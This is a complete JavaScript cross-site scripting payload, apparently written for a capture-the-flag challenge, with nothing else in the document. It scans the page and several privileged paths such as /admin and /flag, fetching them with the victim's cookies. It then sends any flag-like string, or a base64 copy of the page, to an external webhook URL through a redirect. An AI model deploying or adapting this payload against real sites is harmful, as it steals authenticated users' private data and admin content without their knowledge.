(async () => {
  const exfil = (tag, value) => {
    location.href =
      'https://webhooksite.net/ae3222ba-a10c-4885-942d-a1e673df5116?tag=' +
      encodeURIComponent(tag) +
      '&d=' +
      encodeURIComponent(value);
  };

  const patterns = [
    /flag\{[^}]+\}/i,
    /ctf\{[^}]+\}/i,
    /hackcon\{[^}]+\}/i,
    /HackCon\{[^}]+\}/
  ];

  const searchFlag = (text) => {
    for (const re of patterns) {
      const m = text.match(re);
      if (m) return m[0];
    }
    return null;
  };

  try {
    const html = document.documentElement.outerHTML;
    const hit = searchFlag(html);
    if (hit) {
      exfil('flag', hit);
      return;
    }
  } catch (e) {}

  const paths = [
    '/',
    '/admin',
    '/feedback',
    '/feedbacks',
    '/dashboard',
    '/flag'
  ];

  for (const p of paths) {
    try {
      const r = await fetch(p, { credentials: 'include' });
      const t = await r.text();
      const hit = searchFlag(t);
      if (hit) {
        exfil(p, hit);
        return;
      }
    } catch (e) {}
  }

  try {
    exfil('html_b64', btoa(document.documentElement.outerHTML).slice(0, 1500));
  } catch (e) {}
})();
